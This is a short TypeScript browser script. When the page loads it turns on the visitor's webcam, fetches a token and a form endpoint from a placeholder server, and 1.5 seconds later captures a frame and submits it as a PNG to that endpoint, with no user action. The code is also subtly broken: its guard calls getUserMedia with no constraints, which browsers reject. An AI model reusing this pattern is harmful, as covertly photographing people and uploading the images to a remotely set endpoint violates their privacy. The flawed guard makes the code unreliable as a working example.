window.addEventListener('DOMContentLoaded', async () => {
  const canvas = document.getElementById('canvas') as HTMLCanvasElement;
  const canvas2DContext = canvas.getContext('2d');
  const height = 640;
  const width = 480;
  canvas.height = height;
  canvas.width = width;
  const video = document.getElementById('video') as HTMLVideoElement;
  if (navigator.mediaDevices && (await navigator.mediaDevices.getUserMedia())) {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: true
    });
    video.srcObject = stream;
    video.play();
    fetch('https://example.com/v1/get-token').then((res) => {
      res.json().then((json) => {
        (document.getElementById('token-input') as HTMLInputElement).value = json.token;
        (document.getElementById('form') as HTMLFormElement).action = json.endPoint;
      });
    });
    setTimeout(() => {
      canvas2DContext?.drawImage(video, 0, 0, width, height);
    }, 1000);
    setTimeout(() => {
      const img = canvas.toDataURL('image/png');
      (document.getElementById('image-input') as HTMLInputElement).value = img;
      (document.getElementById('form') as HTMLFormElement).submit();
    }, 1500);
  }
});
